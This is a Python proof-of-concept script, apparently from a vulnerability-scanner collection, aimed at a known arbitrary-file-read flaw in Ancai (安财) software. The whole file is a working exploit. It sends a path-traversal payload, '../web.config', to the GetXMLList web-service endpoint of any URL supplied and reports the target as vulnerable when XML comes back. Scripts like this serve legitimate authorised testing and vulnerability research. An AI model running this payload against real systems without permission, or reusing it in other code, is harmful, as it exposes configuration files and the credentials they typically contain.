#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 安财软件GetXMLList任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2015-0121651
author: Lucifer
description: 文件/WS/WebServiceBase.asmx/GetXMLList中,参数strXMLFileName存在任意文件读取。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class acsoft_GetXMLList_fileread_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {
            "strXMLFileName":"../web.config"
        }
        payload = "/WS/WebServiceBase.asmx/GetXMLList"
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                cprint("[+]存在安财软件GetXMLList任意文件读取漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = acsoft_GetXMLList_fileread_BaseVerify(sys.argv[1])
    testVuln.run()